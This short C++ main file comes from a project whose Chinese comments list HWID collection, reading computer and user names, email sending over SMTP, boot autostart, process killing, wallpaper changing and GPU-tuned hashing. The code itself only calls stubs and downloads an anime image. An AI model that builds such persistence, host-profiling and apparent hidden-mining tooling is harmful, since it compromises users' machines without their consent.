#include "Smtp.h"
#include "include/API.h"

#include "HWID_ID.h"


using namespace std;

int main()
{

	GPU_information();
	string usl = "https://image.baidu.com/search/detail?ct=503316480&z=0&ipn=d&word=%E7%81%B0%E5%8E%9F%E5%93%80&hs=2&pn=2&spn=0&di=188980&pi=0&rn=1&tn=baiduimagedetail&is=0%2C0&ie=utf-8&oe=utf-8&cl=2&lm=-1&cs=2656536666%2C1820076282&os=3649766559%2C1308350234&simid=4190473642%2C705844683&adpicid=0&lpn=0&ln=30&fr=ala&fm=&sme=&cg=&bdtype=0&oriquery=%E7%81%B0%E5%8E%9F%E5%93%80&objurl=https%3A%2F%2Fgimg2.baidu.com%2Fimage_search%2Fsrc%3Dhttp%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farchive%2Fcd379b515de19c4f67d1f8d1f62202bee278a158.jpg%26refer%3Dhttp%3A%2F%2Fi0.hdslb.com%26app%3D2002%26size%3Df9999%2C10000%26q%3Da80%26n%3D0%26g%3D0n%26fmt%3Djpeg%3Fsec%3D1625500652%26t%3D9b2203b898a3bafdc6d23c92efba2250&fromurl=ippr_z2C%24qAzdH3FAzdH3F4_z%26e3Bijtbfj5_z%26e3Bv54AzdH3Fw6ptvsjAzdH3Fn8mda_z%26e3Bip4s&gsm=3&islist=&querylist=";
	download(usl);
	log();
	//char system_information;
	//c_box_information();

	/*AutoStart();									
	ifsteam_open_read();					
	email();		*/									
	//return 0;								
	
}

/*
目前完成:HWID\EMAIL\文本读写\COMPUTERNAME+USERNAME读取\开机自启\终结进程\更改桌面壁纸\哈希算法程序\唯一识别注册
可根据显卡具体配置执行哈希算法程序\
	

6.5日：更新了下载模块、GPU识别模块
6.6日：更新日志模块
*/
